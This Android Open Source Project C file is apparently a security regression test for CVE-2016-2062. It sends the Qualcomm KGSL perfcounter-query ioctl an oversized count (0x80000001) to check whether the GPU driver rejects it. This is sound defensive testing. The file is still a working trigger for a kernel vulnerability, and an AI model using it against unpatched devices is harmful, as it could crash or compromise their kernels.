/**
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE

#define LOG_TAG "CVE-2016-2062"

#include <cutils/log.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

struct kgsl_perfcounter_query {
  unsigned int groupid;
  /* Array to return the current countable for up to size counters */
  unsigned int *countables;
  unsigned int count;
  unsigned int max_counters;
  /* private: reserved for future use */
  unsigned int __pad[2]; /* For future binary compatibility */
};

/* ioctls
 * Refer msm_kgsl.h
 */
#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_PERFCOUNTER_QUERY \
  _IOWR(KGSL_IOC_TYPE, 0x3A, struct kgsl_perfcounter_query)

int main() {
  int fd, ret;
  struct kgsl_perfcounter_query perf_query;

  fd = open("/dev/kgsl-3d0", O_RDWR);
  if (fd < 0) {
    ALOGE("Unable to open /dev/kgsl-3d0 - Errno %d (%s)\n", errno,
          strerror(errno));
    exit(EXIT_FAILURE);
  }

  memset(&perf_query, 0, sizeof(struct kgsl_perfcounter_query));

  /* setup sane params to pass a few checks
   * set count=0 and countables=NULL to get max_counters
   * value to allocate memory for countables
   */
  perf_query.groupid = 1;
  perf_query.count = 0;
  perf_query.countables = NULL;

  ret = ioctl(fd, IOCTL_KGSL_PERFCOUNTER_QUERY, &perf_query);
  if (ret < 0) {
    ALOGE("Error ioctl failed %d (%s)\n", errno, strerror(errno));
  } else {
    // Make sure the max_counters is within the limit [1:1000]
    if (perf_query.max_counters > 0 && perf_query.max_counters < 1000) {
      perf_query.countables = (unsigned int *)malloc(perf_query.max_counters *
                                                     sizeof(unsigned int));
      if (perf_query.countables == NULL) {
        ALOGE("malloc failed\n");
      } else {
        /* bad data creates out of memory issue
         * Errno 12 (out of memory)
         */
        perf_query.count = 0x80000001;

        ret = ioctl(fd, IOCTL_KGSL_PERFCOUNTER_QUERY, &perf_query);
        if (ret < 0 && errno == 12) {  // ENOMEM(12) error
          ALOGE("CVE-2016-2062 failed\n");
        } else {
          ALOGE("CVE-2016-2062 passed\n");
        }
      }
    }
  }

  if (NULL != perf_query.countables) {
    free(perf_query.countables);
    perf_query.countables = NULL;
  }

  if (fd > -1) close(fd);

  return EXIT_SUCCESS;
}
